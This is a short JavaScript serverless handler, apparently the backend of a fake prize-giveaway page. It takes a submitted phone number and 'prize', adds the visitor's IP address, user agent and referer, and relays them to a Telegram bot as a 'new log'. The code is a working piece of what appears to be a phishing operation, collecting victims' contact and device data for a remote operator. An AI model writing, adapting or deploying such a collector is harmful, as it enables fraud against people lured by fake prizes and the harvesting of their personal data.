export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    const { phone, prize } = req.body;

    // Собираем доп. инфу
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress;
    const ua = req.headers["user-agent"] || "Неизвестно";
    const ref = req.headers["referer"] || "Прямой заход";

    // Формируем сообщение
    const text = `✅ Новый лог
📞 Номер: ${phone || "—"}
🎁 Приз: ${prize || "—"}
⏰ Время: ${new Date().toLocaleString("ru-RU", { timeZone: "Asia/Almaty" })}
🌍 IP: ${ip}
🖥️ Устройство: ${ua}
🔗 Источник: ${ref}`;

    // Отправка в Telegram
    await fetch(
      `https://api.telegram.org/bot${process.env.TG_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TG_CHAT_ID,
          text,
        }),
      }
    );

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error("Ошибка в log.js:", err);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
